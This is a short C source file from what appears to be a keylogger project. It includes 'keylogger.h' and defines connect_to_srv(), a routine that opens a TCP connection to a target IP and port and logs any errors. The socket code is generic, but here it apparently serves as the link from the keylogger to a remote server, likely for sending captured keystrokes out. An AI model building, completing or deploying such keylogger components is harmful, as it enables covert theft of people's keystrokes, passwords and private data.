
#include "keylogger.h"
#include <arpa/inet.h>
#include <asm-generic/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>

int connect_to_srv(char const *target, int logfd)
{
    int flag = 1;
    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(atoi(PORT)),
        .sin_addr.s_addr = (target) ? inet_addr(target) : INADDR_ANY
    };
    int sockfd = socket(AF_INET, SOCK_STREAM, getprotobyname("TCP")->p_proto);

    if (sockfd == -1 || !target) {
        dprintf(logfd, "socket:%s\n", strerror(errno));
        close(sockfd);
        return -1;
    } if (setsockopt(sockfd, SOL_SOCKET,
    SO_REUSEADDR | SO_REUSEPORT, &flag, sizeof(int)) < 0) {
        dprintf(logfd, "setsockopt:%s\n", strerror(errno));
        close(sockfd);
        return -1;
    } if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        dprintf(logfd, "connect:%s\n", strerror(errno));
        close(sockfd);
        return -1;
    }

    dprintf(logfd, "Socket successfully created!\n");
    return sockfd;
}
